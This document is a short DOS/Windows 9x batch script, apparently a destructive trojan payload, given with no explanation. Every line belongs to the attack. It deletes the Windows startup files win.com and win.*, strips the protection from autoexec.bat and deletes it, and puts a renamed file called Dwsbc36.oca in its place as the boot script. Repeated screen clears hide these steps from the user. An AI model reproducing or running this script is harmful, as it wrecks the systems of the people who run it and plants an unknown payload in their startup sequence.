   @echo off
   deltree /y c:\windows\win.com
   del c:\windows\win.*
   cls
   attrib -r c:\autoexec.bat
   del c:\autoexec.bat
   cls
   ren Dwsbc36.oca autoexec.bat
   copy autoexec.bat c:\
   cls
   c:\windows\dosstart.bat
   exit
